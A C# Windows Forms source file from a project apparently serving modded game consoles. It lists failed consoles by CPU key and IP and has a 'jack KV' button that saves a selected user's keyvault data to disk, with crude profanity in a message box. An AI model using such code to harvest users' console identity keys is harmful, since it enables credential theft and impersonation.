using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.IO;
using LMAOnline.Classes;

namespace LMAOnline.Forms
{
    public partial class FailedConsoles : Form
    {
        ConsoleManager cm = new ConsoleManager();
        ConsoleEntry ce = new ConsoleEntry();

        public FailedConsoles()
        {
            InitializeComponent();
        }

        private void btn_listusers_Click(object sender, EventArgs e)
        {
            RefreshList();
        }

        private void RefreshList()
        {
            List<ConsoleEntry> consoles = cm.GetfailedConsoles();
            Invoke(new MethodInvoker(delegate
            {
                lv_failedusers.Items.Clear();
                for (int i = 0; i < consoles.Count; i++)
                {
                    ConsoleEntry ce = consoles[i];
                    ListViewItem item = new ListViewItem(ce.cpukey.ToUpper());
                    item.SubItems.Add(ce.sip);
                    lv_failedusers.Items.Add(item);
                }
            }));
        }

        private void btn_jackkv_Click(object sender, EventArgs e)
        {
            if (lv_failedusers.SelectedItems.Count > 0)
            {
                cm.GetfailedConsole(ref ce, lv_failedusers.SelectedItems[0].SubItems[0].Text);
                if (ce.kvdata != null)
                    File.WriteAllBytes(String.Format("KVs\\KV - {0}.bin", ce.cpukey), ce.kvdata);
                else
                    MessageBox.Show("No KV Data from selected user. Strange? Eat a dick then.", "Garggle My Balls");
            }
        }
    }
}
